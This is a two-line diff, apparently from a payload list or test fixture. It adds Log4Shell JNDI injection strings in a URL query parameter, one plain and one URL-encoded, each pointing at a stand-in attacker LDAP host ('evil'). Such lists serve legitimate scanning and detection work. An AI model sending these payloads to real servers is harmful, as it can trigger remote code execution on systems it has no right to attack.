@@ -1,0 +1,2 @@
+/?x=${jndi:ldap://evil/x}
+/?x=%24%7Bjndi%3Aldap%3A//evil/x%7D
